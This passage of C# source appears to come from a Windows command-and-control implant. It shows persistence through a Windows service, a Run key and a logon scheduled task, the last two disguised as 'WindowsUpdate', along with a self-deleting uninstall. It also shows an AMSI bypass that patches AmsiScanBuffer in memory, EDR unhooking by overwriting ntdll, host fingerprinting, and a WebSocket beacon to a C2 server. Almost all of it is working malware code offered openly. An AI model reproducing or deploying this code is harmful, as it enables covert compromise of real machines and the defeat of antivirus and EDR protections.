            Console.WriteLine("[DEBUG] InstallPersistence called");

            try
            {
                Console.WriteLine("[DEBUG] Installing as Windows Service...");
                // Primary method: Install as Windows Service
                ServiceInstaller.Install();

                Console.WriteLine("[DEBUG] Installing registry run key...");
                // Fallback methods
                InstallRegistryRunKey();

                Console.WriteLine("[DEBUG] Installing scheduled task...");
                InstallScheduledTask();

                Console.WriteLine("[DEBUG] All persistence methods attempted");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] Primary persistence installation failed: {ex.Message}");
                // If all methods fail, try at least one fallback
                try
                {
                    Console.WriteLine("[DEBUG] Attempting fallback registry method...");
                    InstallRegistryRunKey();
                }
                catch (Exception ex2)
                {
                    Console.WriteLine($"[DEBUG] Registry fallback failed: {ex2.Message}");
                    // Last resort
                    Console.WriteLine("[DEBUG] Attempting last resort scheduled task...");
                    InstallScheduledTask();
                }
            }
        }

        private static void InstallRegistryRunKey()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("WindowsUpdate", Process.GetCurrentProcess().MainModule.FileName);
            }
            catch
            {
                // Registry access might be restricted
            }
        }

        private static void InstallScheduledTask()
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/create /tn \"WindowsUpdate\" /tr \"\\\"{Process.GetCurrentProcess().MainModule.FileName}\\\"\" /sc onlogon",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                process.WaitForExit();
            }
            catch
            {
                // Task creation might fail
            }
        }

        public static void Uninstall()
        {
            try
            {
                // Remove Windows Service
                ServiceInstaller.Uninstall();

                // Remove Registry Run Key
                using var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.DeleteValue("WindowsUpdate", false);

                // Remove Scheduled Task
                var startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = "/delete /tn \"WindowsUpdate\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                process.WaitForExit();

                // Self-delete
                var batchPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                using (var writer = new StreamWriter(batchPath))
                {
                    writer.WriteLine($"@echo off");
                    writer.WriteLine($"timeout /t 2 >nul");
                    writer.WriteLine($"del \"{Process.GetCurrentProcess().MainModule.FileName}\"");
                    writer.WriteLine($"del \"{batchPath}\"");
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = batchPath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Environment.Exit(0);
            }
            catch
            {
                // If uninstall fails, just exit
                Environment.Exit(0);
            }
        }
    }

    // Windows Service Installer
    public static class ServiceInstaller
    {
        public static void Install()
        {
            try
            {
                // Check if already installed
                if (IsInstalled())
                    return;

                // Create service
                var startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"create \"{AppConfig.ServiceName}\" binPath= \"\\\"{Process.GetCurrentProcess().MainModule.FileName}\\\"\" DisplayName= \"{AppConfig.ServiceDisplayName}\" start= auto",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var process = Process.Start(startInfo);
                process.WaitForExit();

                // Set service description
                startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"description \"{AppConfig.ServiceName}\" \"{AppConfig.ServiceDescription}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var descProcess = Process.Start(startInfo);
                descProcess.WaitForExit();

                // Start the service
                startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"start \"{AppConfig.ServiceName}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var startProcess = Process.Start(startInfo);
                startProcess.WaitForExit();
            }
            catch
            {
                // Service installation might fail
            }
        }

        public static void Uninstall()
        {
            try
            {
                if (!IsInstalled())
                    return;

                // Stop and delete the service
                var startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"stop \"{AppConfig.ServiceName}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var stopProcess = Process.Start(startInfo);
                stopProcess.WaitForExit();

                startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"delete \"{AppConfig.ServiceName}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using var deleteProcess = Process.Start(startInfo);
                deleteProcess.WaitForExit();
            }
            catch
            {
                // Service uninstallation might fail
            }
        }

        private static bool IsInstalled()
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"query \"{AppConfig.ServiceName}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true
                };

                using var process = Process.Start(startInfo);
                var output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output.Contains(AppConfig.ServiceName);
            }
            catch
            {
                return false;
            }
        }
    }

    // Windows Service Implementation
    public class C2Service : ServiceBase
    {
        public C2Service()
        {
            ServiceName = AppConfig.ServiceName;
        }

        protected override async void OnStart(string[] args)
        {
            try
            {
                // Initialize configuration
                AppConfig.Initialize();

                // Apply anti-detection techniques
                AntiDetection.BypassAmsi();
                AntiDetection.UnhookEdr();

                // Initialize system info collector
                var systemInfo = SystemInfoCollector.CollectSystemInfo();

                // Initialize WebSocket manager
                var wsManager = WebSocketManager.Instance;
                await wsManager.ConnectAsync(
                    Environment.MachineName,
                    Environment.Is64BitOperatingSystem ? "x64" : "x86",
                    GetOSVersion(),
                    systemInfo
                );
            }
            catch
            {
                // If service fails to start, just exit
                Environment.Exit(1);
            }
        }

        protected override async void OnStop()
        {
            try
            {
                await WebSocketManager.Instance.DisconnectAsync();
            }
            catch
            {
                // Ignore errors during shutdown
            }
        }

        private static string GetOSVersion()
        {
            try
            {
                var version = Environment.OSVersion;
                return $"{version.Platform} {version.Version} (Build {version.Version.Build})";
            }
            catch
            {
                return "Windows";
            }
        }
    }

    // Helper Methods
    public static class HelperMethods
    {
        public static string GenerateMachineFingerprint()
        {
            try
            {
                var components = new List<string>
                {
                    Environment.MachineName,
                    Environment.UserName,
                    Environment.OSVersion.ToString(),
                    Environment.ProcessorCount.ToString(),
                    Environment.Is64BitOperatingSystem.ToString()
                };

                var combined = string.Join("|", components);
                using var sha256 = SHA256.Create();
                var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combined));
                return Convert.ToHexString(hash).Substring(0, 32);
            }
            catch
            {
                return Guid.NewGuid().ToString("N").Substring(0, 32);
            }
        }

        public static string GetLocalIPAddress()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
                return "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }
    }

    // Anti-Detection Techniques
    public static class AntiDetection
    {
        // AMSI Bypass
        public static bool BypassAmsi()
        {
            Console.WriteLine("[DEBUG] BypassAmsi called");

            try
            {
                // This is a simplified AMSI bypass technique
                // In a real implementation, this would be more sophisticated
                Console.WriteLine("[DEBUG] Loading amsi.dll...");
                var amsiDll = LoadLibrary("amsi.dll");

                if (amsiDll != IntPtr.Zero)
                {
                    Console.WriteLine($"[DEBUG] amsi.dll loaded at: 0x{amsiDll.ToInt64():X}");
                    var amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");

                    if (amsiScanBufferAddr != IntPtr.Zero)
                    {
                        Console.WriteLine($"[DEBUG] AmsiScanBuffer found at: 0x{amsiScanBufferAddr.ToInt64():X}");

                        // Patch the AMSI function to always return success
                        var oldProtection = new uint[1];
                        Console.WriteLine("[DEBUG] Changing memory protection...");
                        VirtualProtect(amsiScanBufferAddr, (UIntPtr)8, 0x40, oldProtection);

                        // Write the patch (mov eax, 0x80070057; ret)
                        var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                        Console.WriteLine("[DEBUG] Writing patch bytes...");
                        Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);

                        // Restore original protection
                        Console.WriteLine("[DEBUG] Restoring original protection...");
                        VirtualProtect(amsiScanBufferAddr, (UIntPtr)8, oldProtection[0], oldProtection);

                        Console.WriteLine("[DEBUG] AMSI bypass successful");
                        return true;
                    }
                    else
                    {
                        Console.WriteLine("[DEBUG] AmsiScanBuffer not found");
                    }
                }
                else
                {
                    Console.WriteLine("[DEBUG] Failed to load amsi.dll");
                }
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] AMSI bypass failed: {ex.Message}");
                return false;
            }
        }

        // EDR Hook Unhooking
        public static bool UnhookEdr()
        {
            Console.WriteLine("[DEBUG] UnhookEdr called");

            try
            {
                // This is a simplified EDR unhooking technique
                // In a real implementation, this would be more sophisticated
                Console.WriteLine("[DEBUG] Loading ntdll.dll...");
                var ntdll = LoadLibrary("ntdll.dll");

                if (ntdll != IntPtr.Zero)
                {
                    Console.WriteLine($"[DEBUG] ntdll.dll loaded at: 0x{ntdll.ToInt64():X}");

                    // Get the original ntdll from disk
                    var systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    var ntdllPath = Path.Combine(systemPath, "ntdll.dll");
                    Console.WriteLine($"[DEBUG] Reading clean ntdll from: {ntdllPath}");
                    var cleanNtdll = File.ReadAllBytes(ntdllPath);
                    Console.WriteLine($"[DEBUG] Clean ntdll size: {cleanNtdll.Length} bytes");

                    // Find the PE header
                    var peHeader = BitConverter.ToInt32(cleanNtdll, 0x3C);
                    var sectionsOffset = peHeader + 0xF0;
                    var numberOfSections = BitConverter.ToInt16(cleanNtdll, peHeader + 0x6);
                    Console.WriteLine($"[DEBUG] PE header offset: 0x{peHeader:X}, Sections: {numberOfSections}");

                    // Copy each section from the clean ntdll to the loaded one
                    for (int i = 0; i < numberOfSections; i++)
                    {
                        var sectionHeaderOffset = sectionsOffset + i * 0x28;
                        var virtualAddress = BitConverter.ToInt32(cleanNtdll, sectionHeaderOffset + 0xC);
                        var sizeOfRawData = BitConverter.ToInt32(cleanNtdll, sectionHeaderOffset + 0x10);
                        var pointerToRawData = BitConverter.ToInt32(cleanNtdll, sectionHeaderOffset + 0x14);

                        if (sizeOfRawData > 0)
                        {
                            Console.WriteLine($"[DEBUG] Copying section {i}: VA=0x{virtualAddress:X}, Size={sizeOfRawData}");
                            var source = cleanNtdll.Skip(pointerToRawData).Take(sizeOfRawData).ToArray();
                            var destination = new IntPtr(ntdll.ToInt64() + virtualAddress);
                            Marshal.Copy(source, 0, destination, source.Length);
                        }
                    }

                    Console.WriteLine("[DEBUG] EDR unhooking successful");
                    return true;
                }
                else
                {
                    Console.WriteLine("[DEBUG] Failed to load ntdll.dll");
                }
                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] EDR unhooking failed: {ex.Message}");
                return false;
            }
        }

        // DLL Import declarations
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, uint[] lpflOldProtect);
    }
}